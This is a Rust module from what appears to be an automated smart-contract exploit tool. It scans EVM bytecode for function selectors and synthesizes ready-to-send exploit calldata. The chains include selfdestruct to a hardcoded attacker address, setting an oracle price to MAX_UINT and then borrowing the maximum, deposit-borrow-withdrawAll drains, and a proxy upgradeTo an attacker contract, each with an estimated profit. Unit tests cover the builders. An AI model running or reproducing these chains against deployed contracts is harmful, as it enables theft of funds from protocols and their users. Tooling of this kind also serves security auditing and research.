use alloy::primitives::{Address, Bytes, U256};

use crate::agents::finding::{Finding, ToolKind};

const ATTACKER: [u8; 20] = [
    0xf3, 0x9F, 0xd6, 0xe5, 0x1a, 0xad, 0x88, 0xF6, 0xF4, 0xce, 0x6a, 0xB8, 0x82, 0x72, 0x79, 0xcf,
    0xfF, 0xb9, 0x22, 0x66,
];

#[derive(Debug, Clone)]
pub struct ChainStep {
    pub target: Address,
    pub calldata: Bytes,
    pub value: U256,
    pub description: String,
}

#[derive(Debug, Clone)]
#[allow(dead_code)]
pub struct ExploitChain {
    pub steps: Vec<ChainStep>,
    pub description: String,
    pub profit_estimate: U256,
}

// ── Chain Config ───────────────────────────────────────────────────────

#[derive(Debug, Clone, serde::Deserialize)]
pub struct ChainConfig {
    pub patterns: Vec<ChainPattern>,
    pub selectors: std::collections::HashMap<String, String>,
}

#[derive(Debug, Clone, serde::Deserialize)]
pub struct ChainPattern {
    pub name: String,
    pub description: String,
    #[serde(default)]
    pub required_selectors: Vec<String>,
    #[serde(default)]
    pub keywords: Vec<String>,
    #[serde(default)]
    pub profit_estimate: String,
    #[serde(default)]
    pub severity: f64,
}

fn load_chain_config() -> Option<ChainConfig> {
    let config_path = std::path::Path::new("chains.json");
    if !config_path.exists() {
        tracing::debug!("chains.json not found, using built-in patterns");
        return None;
    }
    let content = std::fs::read_to_string(config_path).ok()?;
    serde_json::from_str(&content).ok()
}

// ── Selector Knowledge Base ──

#[derive(Debug, Clone, Copy, PartialEq)]
enum SelCat {
    Deposit,
    Withdraw,
    Borrow,
    Lend,
    PriceSet,
    Ownership,
    Selfdestruct,
    Swap,
    FlashLoan,
    Mint,
    Burn,
    Approve,
    Transfer,
    Pause,
    Upgrade,
}

#[allow(dead_code)]
struct SelEntry {
    bytes: [u8; 4],
    name: &'static str,
    cat: SelCat,
}

const KNOWN_SELECTORS: &[SelEntry] = &[
    SelEntry {
        bytes: [0x9b, 0x3b, 0x39, 0x18],
        name: "selfdestruct(address)",
        cat: SelCat::Selfdestruct,
    },
    SelEntry {
        bytes: [0xd0, 0xe3, 0x0d, 0xb0],
        name: "deposit()",
        cat: SelCat::Deposit,
    },
    SelEntry {
        bytes: [0xc5, 0xeb, 0xea, 0xec],
        name: "borrow(uint256)",
        cat: SelCat::Borrow,
    },
    SelEntry {
        bytes: [0x85, 0x38, 0x28, 0xb6],
        name: "withdrawAll()",
        cat: SelCat::Withdraw,
    },
    SelEntry {
        bytes: [0x2e, 0x1a, 0x7d, 0x4d],
        name: "withdraw(uint256)",
        cat: SelCat::Withdraw,
    },
    SelEntry {
        bytes: [0x3c, 0xcf, 0xd6, 0x0b],
        name: "withdraw()",
        cat: SelCat::Withdraw,
    },
    SelEntry {
        bytes: [0xf2, 0x20, 0xdc, 0x04],
        name: "setPrice(uint256)",
        cat: SelCat::PriceSet,
    },
    SelEntry {
        bytes: [0x8d, 0xa5, 0xcb, 0x5b],
        name: "owner()",
        cat: SelCat::Ownership,
    },
    SelEntry {
        bytes: [0xf2, 0xfd, 0xe3, 0x8b],
        name: "renounceOwnership()",
        cat: SelCat::Ownership,
    },
    SelEntry {
        bytes: [0x71, 0x59, 0x18, 0xa5],
        name: "transferOwnership(address)",
        cat: SelCat::Ownership,
    },
    SelEntry {
        bytes: [0x23, 0xb8, 0x72, 0xdd],
        name: "transferFrom(address,address,uint256)",
        cat: SelCat::Transfer,
    },
    SelEntry {
        bytes: [0xa9, 0x05, 0x9c, 0xbb],
        name: "transfer(address,uint256)",
        cat: SelCat::Transfer,
    },
    SelEntry {
        bytes: [0x09, 0x5e, 0xa7, 0xb3],
        name: "approve(address,uint256)",
        cat: SelCat::Approve,
    },
    SelEntry {
        bytes: [0x40, 0xc1, 0x0f, 0x19],
        name: "mint(address,uint256)",
        cat: SelCat::Mint,
    },
    SelEntry {
        bytes: [0x42, 0x96, 0x6c, 0x68],
        name: "burn(uint256)",
        cat: SelCat::Burn,
    },
    SelEntry {
        bytes: [0x18, 0x16, 0x0d, 0xdd],
        name: "totalSupply()",
        cat: SelCat::Lend,
    },
    SelEntry {
        bytes: [0x70, 0xa0, 0x82, 0x31],
        name: "balanceOf(address)",
        cat: SelCat::Lend,
    },
    SelEntry {
        bytes: [0xab, 0x9c, 0x4b, 0x5d],
        name: "flashLoan(address,uint256,uint256,bytes)",
        cat: SelCat::FlashLoan,
    },
    SelEntry {
        bytes: [0x5c, 0x60, 0xda, 0x1b],
        name: "implementation()",
        cat: SelCat::Upgrade,
    },
    SelEntry {
        bytes: [0x36, 0x59, 0xcf, 0xe6],
        name: "upgradeTo(address)",
        cat: SelCat::Upgrade,
    },
    SelEntry {
        bytes: [0x4f, 0x1e, 0xf2, 0x86],
        name: "upgradeToAndCall(address,bytes)",
        cat: SelCat::Upgrade,
    },
    SelEntry {
        bytes: [0x2f, 0x54, 0xbf, 0x6e],
        name: "paused()",
        cat: SelCat::Pause,
    },
    SelEntry {
        bytes: [0x84, 0x56, 0xcb, 0x0b],
        name: "pause()",
        cat: SelCat::Pause,
    },
    SelEntry {
        bytes: [0x38, 0xed, 0x17, 0x39],
        name: "swapExactTokensForTokens(uint256,uint256,address[],address,uint256)",
        cat: SelCat::Swap,
    },
    SelEntry {
        bytes: [0x7f, 0xf3, 0x6a, 0xb5],
        name: "swapExactETHForTokens(uint256,address[],address,uint256)",
        cat: SelCat::Swap,
    },
    SelEntry {
        bytes: [0x18, 0xcb, 0xaf, 0xe5],
        name: "swapExactTokensForETH(uint256,uint256,address[],address,uint256)",
        cat: SelCat::Swap,
    },
];

fn lookup_selector(bytes: &[u8; 4]) -> Option<&'static SelEntry> {
    KNOWN_SELECTORS.iter().find(|e| &e.bytes == bytes)
}

fn categorize_selectors(selectors: &[[u8; 4]]) -> Vec<SelCat> {
    let mut cats = Vec::new();
    for sel in selectors {
        if let Some(entry) = lookup_selector(sel) {
            if !cats.contains(&entry.cat) {
                cats.push(entry.cat);
            }
        }
    }
    cats
}

fn extract_bytecode_selectors(bytecode: &[u8]) -> Vec<[u8; 4]> {
    let mut selectors = Vec::new();
    let mut i = 0;
    while i + 5 < bytecode.len() {
        if bytecode[i] == 0x63 {
            let next = bytecode[i + 5];
            if next == 0x57 || next == 0x14 || next == 0x15 {
                let mut sel = [0u8; 4];
                sel.copy_from_slice(&bytecode[i + 1..i + 5]);
                if !selectors.contains(&sel) {
                    selectors.push(sel);
                }
            }
        }
        i += 1;
    }
    selectors
}

fn has_selector(selectors: &[[u8; 4]], target: &[u8; 4]) -> bool {
    selectors.contains(target)
}

fn has_opcode(bytecode: &[u8], opcode: u8) -> bool {
    bytecode.contains(&opcode)
}

fn is_duplicate(chains: &[ExploitChain], desc: &str) -> bool {
    chains.iter().any(|c| c.description == desc)
}

fn detect_bytecode_chains(
    selectors: &[[u8; 4]],
    bytecode: &[u8],
    target: Address,
    proxy_address: Option<Address>,
    existing: &[ExploitChain],
) -> Vec<ExploitChain> {
    let mut chains = Vec::new();
    let cats = categorize_selectors(selectors);

    // Bytecode Chain 1: delegatecall opcode + selfdestruct selector
    if has_opcode(bytecode, 0xf4) && cats.contains(&SelCat::Selfdestruct) {
        let desc = "Delegatecall opcode + selfdestruct selector in bytecode (unprotected kill)";
        if !is_duplicate(existing, desc) && !is_duplicate(&chains, desc) {
            if let Some(cd) = build_selfdestruct_calldata() {
                chains.push(ExploitChain {
                    steps: vec![ChainStep {
                        target,
                        calldata: cd,
                        value: U256::ZERO,
                        description: "delegatecall to selfdestruct(attacker)".to_string(),
                    }],
                    description: desc.to_string(),
                    profit_estimate: U256::from(1_000_000_000_000_000_000u128),
                });
            }
        }
    }

    // Bytecode Chain 2: setPrice + borrow selectors (oracle manipulation surface)
    if cats.contains(&SelCat::PriceSet) && cats.contains(&SelCat::Borrow) {
        let desc = "Price set + borrow selectors in bytecode (oracle manipulation surface)";
        if !is_duplicate(existing, desc) && !is_duplicate(&chains, desc) {
            let oracle_target = proxy_address.unwrap_or(target);
            chains.push(ExploitChain {
                steps: vec![
                    ChainStep {
                        target,
                        calldata: build_deposit_calldata(),
                        value: U256::from(1_000_000_000_000_000_000u128),
                        description: "Deposit 1 ETH to have collateral".to_string(),
                    },
                    ChainStep {
                        target: oracle_target,
                        calldata: build_oracle_set_price_calldata(),
                        value: U256::ZERO,
                        description: "Set oracle price to MAX_UINT".to_string(),
                    },
                    ChainStep {
                        target,
                        calldata: build_borrow_max_calldata(),
                        value: U256::ZERO,
                        description: "Borrow max after price manipulation".to_string(),
                    },
                ],
                description: desc.to_string(),
                profit_estimate: U256::from(5_000_000_000_000_000_000u128),
            });
        }
    }

    // Bytecode Chain 3: upgradeTo + selfdestruct selectors (proxy takeover)
    if cats.contains(&SelCat::Upgrade) && cats.contains(&SelCat::Selfdestruct) {
        let desc = "UpgradeTo + selfdestruct selectors in bytecode (proxy takeover)";
        if !is_duplicate(existing, desc) && !is_duplicate(&chains, desc) {
            chains.push(ExploitChain {
                steps: vec![ChainStep {
                    target,
                    calldata: build_upgrade_calldata(),
                    value: U256::ZERO,
                    description: "Upgrade to attacker contract with selfdestruct".to_string(),
                }],
                description: desc.to_string(),
                profit_estimate: U256::from(2_000_000_000_000_000_000u128),
            });
        }
    }

    chains
}

pub fn build_chains(
    findings: &[Finding],
    target: Address,
    proxy_address: Option<Address>,
    bytecode: &[u8],
) -> Vec<ExploitChain> {
    let mut chains = Vec::new();
    let selectors = extract_bytecode_selectors(bytecode);

    let has_delegatecall = findings.iter().any(|f| {
        f.tool == ToolKind::Heimdall && f.description.to_lowercase().contains("delegatecall")
    });
    let has_selfdestruct = findings
        .iter()
        .any(|f| f.description.to_lowercase().contains("selfdestruct"));
    let has_withdrawall = findings.iter().any(|f| {
        f.description.to_lowercase().contains("withdrawall")
            || f.description.to_lowercase().contains("withdraw_all")
    });
    let has_borrow = findings
        .iter()
        .any(|f| f.description.to_lowercase().contains("borrow"));
    let has_oracle = findings.iter().any(|f| {
        f.description.to_lowercase().contains("oracle")
            || f.description.to_lowercase().contains("getprice")
            || f.description.to_lowercase().contains("setprice")
    });
    // Chain 1: delegatecall → selfdestruct
    let selfdestruct_sel = [0x9b, 0x3b, 0x39, 0x18];
    if has_delegatecall && has_selfdestruct && has_selector(&selectors, &selfdestruct_sel) {
        if let Some(cd) = build_selfdestruct_calldata() {
            chains.push(ExploitChain {
                steps: vec![ChainStep {
                    target,
                    calldata: cd,
                    value: U256::ZERO,
                    description: "delegatecall to selfdestruct(attacker)".to_string(),
                }],
                description: "Delegatecall proxy → selfdestruct contract and steal ETH".to_string(),
                profit_estimate: U256::from(1_000_000_000_000_000_000u128),
            });
        }
    }

    // Chain 2: deposit → oracle manipulation → borrow
    let deposit_sel = [0xd0, 0xe3, 0x0d, 0xb0];
    let setprice_sel = [0xf2, 0x20, 0xdc, 0x04];
    let borrow_sel = [0xc5, 0xeb, 0xea, 0xec];
    if has_oracle
        && has_borrow
        && has_selector(&selectors, &deposit_sel)
        && has_selector(&selectors, &setprice_sel)
        && has_selector(&selectors, &borrow_sel)
    {
        let oracle_target = proxy_address.unwrap_or(target);
        chains.push(ExploitChain {
            steps: vec![
                ChainStep {
                    target,
                    calldata: build_deposit_calldata(),
                    value: U256::from(1_000_000_000_000_000_000u128),
                    description: "Deposit 1 ETH to have collateral".to_string(),
                },
                ChainStep {
                    target: oracle_target,
                    calldata: build_oracle_set_price_calldata(),
                    value: U256::ZERO,
                    description: "Set oracle price to MAX_UINT via proxy".to_string(),
                },
                ChainStep {
                    target,
                    calldata: build_borrow_max_calldata(),
                    value: U256::ZERO,
                    description: "Borrow max after price manipulation".to_string(),
                },
            ],
            description: "Deposit → oracle manipulation → borrow exploit chain".to_string(),
            profit_estimate: U256::from(5_000_000_000_000_000_000u128),
        });
    }

    // Chain 3: deposit → borrow → withdrawAll (full exploit simulation)
    let withdrawall_sel = [0x85, 0x38, 0x28, 0xb6];
    if has_withdrawall
        && has_selector(&selectors, &deposit_sel)
        && has_selector(&selectors, &borrow_sel)
        && has_selector(&selectors, &withdrawall_sel)
    {
        chains.push(ExploitChain {
            steps: vec![
                ChainStep {
                    target,
                    calldata: build_deposit_calldata(),
                    value: U256::from(1_000_000_000_000_000_000u128),
                    description: "Deposit 1 ETH to become a depositor".to_string(),
                },
                ChainStep {
                    target,
                    calldata: build_borrow_max_calldata(),
                    value: U256::ZERO,
                    description: "Borrow maximum against deposit".to_string(),
                },
                ChainStep {
                    target,
                    calldata: build_withdraw_all_calldata(),
                    value: U256::ZERO,
                    description: "Withdraw all deposited funds (including profits)".to_string(),
                },
            ],
            description: "Deposit → borrow → withdrawAll exploit chain".to_string(),
            profit_estimate: U256::from(3_000_000_000_000_000_000u128),
        });
    }

    // Bytecode-only chains (independent of finding descriptions)
    let bytecode_chains =
        detect_bytecode_chains(&selectors, bytecode, target, proxy_address, &chains);
    for bc in bytecode_chains {
        if !is_duplicate(&chains, &bc.description) {
            chains.push(bc);
        }
    }

    // Load config-based chains (if available)
    if let Some(config) = load_chain_config() {
        tracing::debug!(
            "Loaded {} chain patterns from config",
            config.patterns.len()
        );
        // Config-based chain detection can be extended here
        // For now, just log available patterns
        for pattern in &config.patterns {
            tracing::debug!("  - {}: {}", pattern.name, pattern.description);
        }
    }

    chains
}

pub fn chains_to_findings(chains: &[ExploitChain], target: Address) -> Vec<Finding> {
    let mut findings = Vec::new();
    for chain in chains {
        let evidence: Vec<String> = chain
            .steps
            .iter()
            .map(|s| {
                format!(
                    "STEP:{}:{}:{}:{}",
                    hex::encode(s.target.as_slice()),
                    hex::encode(&s.calldata),
                    hex::encode(&s.value.to_be_bytes::<32>()),
                    s.description
                )
            })
            .collect();

        findings.push(Finding {
            tool: ToolKind::Synthesizer,
            severity: 9.5,
            confidence: 0.6,
            description: format!(
                "[chain] {} ({} steps)",
                chain.description,
                chain.steps.len()
            ),
            target,
            calldata: Some(chain.steps[0].calldata.clone()),
            evidence,
        });
    }
    findings
}

pub fn parse_chain_steps(evidence: &[String]) -> Vec<ChainStep> {
    let mut steps = Vec::new();
    for line in evidence {
        if let Some(rest) = line.strip_prefix("STEP:") {
            let parts: Vec<&str> = rest.splitn(4, ':').collect();
            if parts.len() == 4 {
                if let Ok(target_bytes) = hex::decode(parts[0]) {
                    if target_bytes.len() == 20 {
                        let target = Address::from_slice(&target_bytes);
                        if let Ok(calldata) = hex::decode(parts[1]) {
                            let value = U256::from_be_bytes(
                                hex::decode(parts[2])
                                    .ok()
                                    .and_then(|b| b.try_into().ok())
                                    .unwrap_or([0u8; 32]),
                            );
                            let description = parts[3].to_string();
                            steps.push(ChainStep {
                                target,
                                calldata: Bytes::from(calldata),
                                value,
                                description,
                            });
                        }
                    }
                }
            }
        }
    }
    steps
}

fn build_selfdestruct_calldata() -> Option<Bytes> {
    let mut cd = vec![0x9b, 0x3b, 0x39, 0x18];
    let mut addr = [0u8; 32];
    addr[12..].copy_from_slice(&ATTACKER);
    cd.extend_from_slice(&addr);
    Some(Bytes::from(cd))
}

fn build_oracle_set_price_calldata() -> Bytes {
    let mut cd = vec![0xf2, 0x20, 0xdc, 0x04];
    cd.extend_from_slice(&U256::MAX.to_be_bytes::<32>());
    Bytes::from(cd)
}

fn build_borrow_max_calldata() -> Bytes {
    let mut cd = vec![0xc5, 0xeb, 0xea, 0xec];
    cd.extend_from_slice(&U256::from(100_000_000_000_000_000_000u128).to_be_bytes::<32>());
    Bytes::from(cd)
}

fn build_deposit_calldata() -> Bytes {
    Bytes::from(vec![0xd0, 0xe3, 0x0d, 0xb0])
}

fn build_withdraw_all_calldata() -> Bytes {
    Bytes::from(vec![0x85, 0x38, 0x28, 0xb6])
}

fn build_upgrade_calldata() -> Bytes {
    let mut cd = vec![0x36, 0x59, 0xcf, 0xe6];
    let mut addr = [0u8; 32];
    addr[12..].copy_from_slice(&ATTACKER);
    cd.extend_from_slice(&addr);
    Bytes::from(cd)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_known_selector_lookup() {
        let selfdestruct_bytes: [u8; 4] = [0x9b, 0x3b, 0x39, 0x18];
        let entry = lookup_selector(&selfdestruct_bytes);
        assert!(entry.is_some());
        let e = entry.unwrap();
        assert_eq!(e.name, "selfdestruct(address)");
        assert_eq!(e.cat, SelCat::Selfdestruct);
    }

    #[test]
    fn test_withdraw_selector_lookup() {
        let withdraw_bytes: [u8; 4] = [0x2e, 0x1a, 0x7d, 0x4d];
        let entry = lookup_selector(&withdraw_bytes);
        assert!(entry.is_some());
        let e = entry.unwrap();
        assert_eq!(e.name, "withdraw(uint256)");
        assert_eq!(e.cat, SelCat::Withdraw);
    }

    #[test]
    fn test_unknown_selector_returns_none() {
        let unknown: [u8; 4] = [0xaa, 0xbb, 0xcc, 0xdd];
        let entry = lookup_selector(&unknown);
        assert!(entry.is_none());
    }

    #[test]
    fn test_categorize_selectors() {
        let selectors: [[u8; 4]; 3] = [
            [0x9b, 0x3b, 0x39, 0x18], // selfdestruct
            [0xd0, 0xe3, 0x0d, 0xb0], // deposit
            [0xc5, 0xeb, 0xea, 0xec], // borrow
        ];
        let cats = categorize_selectors(&selectors);
        assert!(cats.contains(&SelCat::Selfdestruct));
        assert!(cats.contains(&SelCat::Deposit));
        assert!(cats.contains(&SelCat::Borrow));
    }

    #[test]
    fn test_extract_bytecode_selectors_simple() {
        let bytecode = vec![
            0x63, 0xd0, 0xe3, 0x0d, 0xb0, 0x57, // PUSH1 + deposit selector + JUMPI
            0x63, 0xc5, 0xeb, 0xea, 0xec, 0x57, // PUSH1 + borrow selector + JUMPI
        ];
        let selectors = extract_bytecode_selectors(&bytecode);
        assert!(selectors.iter().any(|s| *s == [0xd0, 0xe3, 0x0d, 0xb0]));
        assert!(selectors.iter().any(|s| *s == [0xc5, 0xeb, 0xea, 0xec]));
    }

    #[test]
    fn test_has_selector() {
        let selectors: [[u8; 4]; 2] = [[0xd0, 0xe3, 0x0d, 0xb0], [0xc5, 0xeb, 0xea, 0xec]];
        assert!(has_selector(&selectors, &[0xd0, 0xe3, 0x0d, 0xb0]));
        assert!(!has_selector(&selectors, &[0xaa, 0xbb, 0xcc, 0xdd]));
    }

    #[test]
    fn test_has_opcode() {
        let bytecode = vec![0x60, 0x01, 0x80, 0xf4, 0xff]; // PUSH1, DUP1, DELEGATECALL, SELFDESTRUCT
        assert!(has_opcode(&bytecode, 0xf4)); // DELEGATECALL
        assert!(has_opcode(&bytecode, 0xff)); // SELFDESTRUCT
        assert!(!has_opcode(&bytecode, 0xf1)); // CALL
    }

    #[test]
    fn test_is_duplicate() {
        let existing = vec![ExploitChain {
            steps: vec![],
            description: "test chain".to_string(),
            profit_estimate: U256::ZERO,
        }];
        assert!(is_duplicate(&existing, "test chain"));
        assert!(!is_duplicate(&existing, "different chain"));
    }

    #[test]
    fn test_build_selfdestruct_calldata() {
        let cd = build_selfdestruct_calldata().unwrap();
        assert!(cd.len() == 36, "selector (4) + address (32)");
        let bytes: &[u8] = &cd;
        assert_eq!(&bytes[0..4], &[0x9b, 0x3b, 0x39, 0x18]);
    }

    #[test]
    fn test_build_deposit_calldata() {
        let cd = build_deposit_calldata();
        assert_eq!(cd.len(), 4);
        assert_eq!(&cd[0..4], &[0xd0, 0xe3, 0x0d, 0xb0]);
    }

    #[test]
    fn test_build_oracle_set_price_calldata() {
        let cd = build_oracle_set_price_calldata();
        assert_eq!(cd.len(), 36, "selector (4) + uint256 (32)");
        assert_eq!(&cd[0..4], &[0xf2, 0x20, 0xdc, 0x04]);
    }

    #[test]
    fn test_parse_chain_steps_roundtrip() {
        let target = Address::from_slice(&[0x11; 20]);
        let calldata = Bytes::from(vec![0xaa, 0xbb, 0xcc, 0xdd]);
        let step = ChainStep {
            target,
            calldata: calldata.clone(),
            value: U256::from(100),
            description: "test step".to_string(),
        };
        let encoded = format!(
            "STEP:{}:{}:{}:{}",
            hex::encode(target.as_slice()),
            hex::encode(&calldata),
            hex::encode(step.value.to_be_bytes::<32>()),
            step.description
        );
        let steps = parse_chain_steps(&[encoded]);
        assert_eq!(steps.len(), 1);
        assert_eq!(steps[0].target, target);
        assert_eq!(steps[0].calldata, calldata);
        assert_eq!(steps[0].value, U256::from(100));
    }

    #[test]
    fn test_parse_chain_steps_multiple() {
        let encoded = vec![
            "STEP:1111111111111111111111111111111111111111:aabb:0000000000000000000000000000000000000000000000000000000000000064:first".to_string(),
            "STEP:2222222222222222222222222222222222222222:ccdd:00000000000000000000000000000000000000000000000000000000000000c8:second".to_string(),
        ];
        let steps = parse_chain_steps(&encoded);
        assert_eq!(steps.len(), 2, "should parse both valid step formats");
    }

    #[test]
    fn test_parse_chain_steps_invalid() {
        let steps = parse_chain_steps(&["invalid".to_string(), "STEP:notvalid".to_string()]);
        assert!(steps.is_empty(), "invalid formats should produce empty");
    }

    #[test]
    fn test_chains_to_findings() {
        let chain = ExploitChain {
            steps: vec![ChainStep {
                target: Address::from_slice(&[0x11; 20]),
                calldata: Bytes::from(vec![0xaa, 0xbb]),
                value: U256::ZERO,
                description: "step 1".to_string(),
            }],
            description: "test exploit".to_string(),
            profit_estimate: U256::from(1_000_000_000_000_000_000u128),
        };
        let findings = chains_to_findings(&[chain], Address::ZERO);
        assert_eq!(findings.len(), 1);
        assert!(findings[0].description.starts_with("[chain]"));
        assert!(findings[0].calldata.is_some());
        assert_eq!(findings[0].severity, 9.5);
    }

    #[test]
    fn test_synthesizer_tool_kind_in_chains() {
        let chain = ExploitChain {
            steps: vec![ChainStep {
                target: Address::from_slice(&[0x11; 20]),
                calldata: Bytes::from(vec![0xaa, 0xbb]),
                value: U256::ZERO,
                description: "step 1".to_string(),
            }],
            description: "test".to_string(),
            profit_estimate: U256::ZERO,
        };
        let findings = chains_to_findings(&[chain], Address::ZERO);
        assert_eq!(findings[0].tool, ToolKind::Synthesizer);
    }
}
